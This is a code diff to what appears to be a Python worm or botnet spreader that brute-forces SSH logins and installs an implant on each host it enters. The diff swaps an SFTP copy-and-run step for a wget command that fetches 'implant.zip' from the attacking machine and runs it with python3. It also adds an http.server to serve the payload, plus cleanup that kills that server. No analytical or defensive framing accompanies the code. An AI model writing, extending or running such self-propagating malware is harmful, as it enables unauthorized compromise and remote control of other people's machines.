@@ -15,6 +15,12 @@ from random import randint, choice, shuffle
 from scapy.all import IP, TCP, sr1, RandShort, DNS, DNSQR, UDP
 
 MY_IP = "0.0.0.0"
+
+try:
+    BOOTSTRAP_IP = sys.argv[1]
+except:
+    BOOTSTRAP_IP = '192.168.1.48'
+
 UDP_PORT = "9191"
 OUR_DNS = "192.168.1.1"
 LOCK_FILE = '/tmp/b'
@@ -150,18 +156,11 @@ class ssh_login(Thread):
 
         try:
             s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)
-
-            # Copy malware locally and execute.
-            sftp = paramiko.SFTPClient.from_transport(s)
-            f_name = "/tmp/{}".format(IMPL_FILE)
-            sftp.put(f_name, f_name)
-            sin, sout, serr = s.exec_command("python3 {} &".format(f_name))
-            
-            """
-            # Download malware from loader and execute.
-            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry.py;python3 /tmp/bot.py {} {} &touch /tmp/done;".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
+ 
+            # Download malware.
+            cmd = "wget -O /tmp/implant.zip {}:{}/implant.zip;python3 /tmp/implant.zip {} &touch /tmp/done;".format(MY_IP, 8000, BOOTSTRAP_IP)
             sin, sout, serr = s.exec_command(cmd)
-            """
+            
             sout.channel.recv_exit_status()
 
             print('Login successful using {} {} {}.'.format(self._ip, self._uname, self._pwd))
@@ -303,6 +302,9 @@ kill_processes()
 
 get_my_ip()
 
+# Start the server
+os.system("cd /tmp;python3 -m http.server 8000&")
+
 signal.signal(signal.SIGHUP, signal.SIG_IGN)
 signal.signal(signal.SIGINT, int_handler)
 EVENT_LOOP = asyncio.get_event_loop()
@@ -322,4 +324,6 @@ except KeyboardInterrupt:
 finally:
     if os.path.exists(LOCK_FILE):
         os.remove(LOCK_FILE)
+    # Kill the server
+    os.system("kill -9 `ps ax | grep http.server | grep -v grep | awk '{ print $1}'`")
     EVENT_LOOP.close()
